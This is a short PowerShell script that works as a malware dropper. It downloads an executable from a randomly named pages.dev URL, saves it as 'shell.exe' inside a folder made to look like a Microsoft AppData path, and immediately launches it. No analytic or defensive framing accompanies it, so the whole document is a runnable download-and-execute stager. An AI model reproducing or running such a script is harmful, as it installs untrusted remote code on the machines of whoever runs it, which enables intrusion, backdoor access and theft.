$url = "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/files/sethc.exe"
$folderPath = "$env:USERPROFILE\AppData\Local\Microsoft\packages"
$localPath = "$folderPath\shell.exe"

if (-Not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath
}

Invoke-WebRequest -Uri $url -OutFile $localPath -UseBasicParsing -Force

Start-Process $localPath
